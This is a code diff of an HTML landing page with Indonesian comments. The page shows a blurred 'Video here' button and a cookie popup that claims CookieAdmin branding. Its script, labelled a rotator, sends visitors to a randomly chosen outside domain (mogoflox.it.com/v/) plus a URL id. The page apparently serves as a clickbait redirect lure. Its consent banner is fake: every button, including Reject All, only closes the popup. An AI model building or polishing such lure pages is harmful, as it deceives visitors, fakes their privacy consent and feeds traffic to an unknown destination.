@@ -3,68 +3,80 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>suhs – hodratxhub click</title>
+    <title>Video Access</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        body {
+        :root {
+            --primary-blue: #1877f2;
+            --text-gray: #606770;
+            --video-blue: #2c4da7;
+            --video-yellow: #f1c40f;
+        }
+
+        body, html {
             margin: 0;
             padding: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-            background-color: #ffffff;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f7f8fa;
             height: 100vh;
             display: flex;
-            flex-direction: column;
-            align-items: center;
-            overflow: hidden; /* Mencegah scroll saat ada popup */
-        }
-
-        /* Container utama agar tombol di tengah */
-        .content-wrapper {
-            flex: 1;
-            display: flex;
-            align-items: center; /* Memposisikan ke tengah vertikal */
             justify-content: center;
-            width: 100%;
-            padding-bottom: 150px; /* Memberi ruang agar tidak tertutup popup cookie */
+            align-items: center;
+            overflow: hidden;
         }
 
-        .btn-video {
-            text-decoration: none;
-            font-size: 26px;
-            font-weight: bold;
-            cursor: pointer;
-            border: none;
+        /* Konten Utama */
+        .main-container {
+            text-align: center;
+            transition: filter 0.3s ease;
+        }
+
+        /* Blur saat popup muncul */
+        .is-blurred {
+            filter: blur(4px);
+        }
+
+        .btn-video-link {
             background: none;
+            border: none;
+            font-size: 28px;
+            font-weight: 700;
+            cursor: pointer;
             display: flex;
             align-items: center;
-            gap: 5px;
-            white-space: nowrap;
+            gap: 8px;
+            text-decoration: none;
+            transition: transform 0.2s;
         }
 
-        /* Warna spesifik sesuai contoh: Biru dan Kuning */
-        .text-blue { color: #2c4da7; }
-        .text-yellow { color: #f1c40f; }
+        .btn-video-link:active {
+            transform: scale(0.95);
+        }
 
-        /* Overlay Gelap */
-        .cookie-overlay {
+        .blue-part { color: var(--video-blue); }
+        .yellow-part { color: var(--video-yellow); }
+
+        /* Overlay Popup */
+        .overlay {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.4);
+            background: rgba(0, 0, 0, 0.5);
             display: flex;
-            align-items: flex-end; /* Di bawah untuk HP */
+            align-items: flex-end; /* Mobile friendly bottom sheet */
             justify-content: center;
-            z-index: 1000;
+            z-index: 9999;
         }
 
-        /* Kotak Popup Putih */
-        .cookie-box {
-            background: #fff;
+        /* Kotak Cookie Modern */
+        .cookie-card {
+            background: #ffffff;
             width: 100%;
-            max-width: 500px;
-            padding: 25px;
-            border-radius: 15px 15px 0 0; /* Melengkung di atas saja */
-            box-shadow: 0 -2px 10px rgba(0,0,0,0.1);
-            animation: slideUp 0.3s ease-out;
+            max-width: 450px;
+            padding: 30px 24px;
+            border-radius: 20px 20px 0 0;
+            box-shadow: 0 -10px 25px rgba(0,0,0,0.1);
+            text-align: center; /* Tulisan Tengah */
+            animation: slideUp 0.4s cubic-bezier(0.25, 1, 0.5, 1);
         }
 
         @keyframes slideUp {
@@ -72,55 +84,70 @@
             to { transform: translateY(0); }
         }
 
-        .cookie-box h2 {
-            margin: 0 0 15px 0;
-            font-size: 20px;
-            color: #000;
+        .cookie-card h2 {
+            font-size: 22px;
             font-weight: 700;
+            margin: 0 0 12px 0;
+            color: #1c1e21;
         }
 
-        .cookie-box p {
-            font-size: 14px;
-            color: #4b4f56;
-            line-height: 1.4;
-            margin-bottom: 20px;
-        }
-
-        /* Tombol Cookie Bertumpuk (Gaya Mobile) */
-        .cookie-buttons {
-            display: flex;
-            flex-direction: column; /* Tombol ke bawah */
-            gap: 10px;
-        }
-
-        .btn-cookie {
-            width: 100%;
-            padding: 12px;
-            border-radius: 8px;
-            font-weight: 600;
+        .cookie-card p {
             font-size: 15px;
+            color: var(--text-gray);
+            line-height: 1.6;
+            margin-bottom: 25px;
+        }
+
+        /* Tombol Cookie */
+        .button-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .btn-base {
+            width: 100%;
+            padding: 14px;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
-            border: 1px solid #ddd;
-            text-align: center;
-            background: #fff;
+            transition: all 0.2s;
+            border: 1px solid #dddfe2;
+            background: #ffffff;
             color: #4b4f56;
         }
 
-        .btn-accept {
-            background: #1877f2;
-            color: #fff;
+        .btn-primary {
+            background: var(--primary-blue);
+            color: white;
             border: none;
         }
 
-        .footer-powered {
-            margin-top: 15px;
-            font-size: 12px;
-            color: #90949c;
-            text-align: center;
+        .btn-primary:hover { background: #166fe5; }
+        .btn-base:not(.btn-primary):hover { background: #f2f3f5; }
+
+        /* Footer CookieAdmin Berwarna */
+        .cookie-footer {
+            margin-top: 20px;
+            font-size: 13px;
+            color: #8a8d91;
             display: flex;
             align-items: center;
             justify-content: center;
-            gap: 5px;
+            gap: 6px;
+        }
+
+        .admin-brand {
+            color: #00c4cc; /* Warna Turquoise Modern */
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .admin-brand i {
+            color: #00c4cc;
         }
 
         .hidden { display: none !important; }
@@ -128,46 +155,54 @@
 </head>
 <body>
 
-    <div class="content-wrapper">
-        <button class="btn-video" onclick="redirectToLink()">
-            <span class="text-blue">🔗👉</span><span class="text-blue">Video</span> <span class="text-yellow">here</span><span class="text-blue">🔗</span>
+    <div id="mainContent" class="main-container is-blurred">
+        <button class="btn-video-link" onclick="handleVideoClick()">
+            <span class="blue-part">🔗👉Video</span> 
+            <span class="yellow-part">here</span>
+            <span class="blue-part">🔗</span>
         </button>
     </div>
 
-    <div id="cookieOverlay" class="cookie-overlay">
-        <div class="cookie-box">
+    <div id="cookieModal" class="overlay">
+        <div class="cookie-card">
             <h2>We respect your privacy</h2>
             <p>
                 Cookies help us improve your experience, deliver personalized content, and analyze traffic. 
-                You can choose which cookies to allow by clicking Customize. Click Accept All to consent or Reject All to decline non-essential cookies.
+                Manage your preferences or click "Accept All" to continue.
             </p>
-            <div class="cookie-buttons">
-                <div class="btn-cookie" onclick="closePopup()">Customize</div>
-                <div class="btn-cookie" onclick="closePopup()">Reject All</div>
-                <div class="btn-cookie btn-accept" onclick="closePopup()">Accept All</div>
+            
+            <div class="button-group">
+                <button class="btn-base btn-primary" onclick="dismissModal()">Accept All</button>
+                <button class="btn-base" onclick="dismissModal()">Reject All</button>
+                <button class="btn-base" onclick="dismissModal()">Customize</button>
             </div>
-            <div class="footer-powered">
-                Powered by <img src="https://www.google.com/s2/favicons?domain=cookieadmin.com" width="14"> <strong>CookieAdmin</strong>
+
+            <div class="cookie-footer">
+                Powered by 
+                <span class="admin-brand">
+                    <i class="fa-solid fa-cookie-bite"></i> CookieAdmin
+                </span>
             </div>
         </div>
     </div>
 
     <script>
+        // Logika Rotator
         const urlParams = new URLSearchParams(window.location.search);
         const videoId = urlParams.get('id') || 'default';
 
         const daftarDomain = [
-            "https://mogoflox.it.com/",
+            "https://mogoflox.it.com/v/",
         ];
 
-        function redirectToLink() {
-            const domainTerpilih = daftarDomain[Math.floor(Math.random() * daftarDomain.length)];
-            window.location.href = domainTerpilih + videoId;
+        function handleVideoClick() {
+            const domain = daftarDomain[Math.floor(Math.random() * daftarDomain.length)];
+            window.location.href = domain + videoId;
         }
 
-        function closePopup() {
-            document.getElementById('cookieOverlay').classList.add('hidden');
-            document.body.style.overflow = 'auto'; // Izinkan scroll setelah popup tutup
+        function dismissModal() {
+            document.getElementById('cookieModal').classList.add('hidden');
+            document.getElementById('mainContent').classList.remove('is-blurred');
         }
     </script>
 </body>
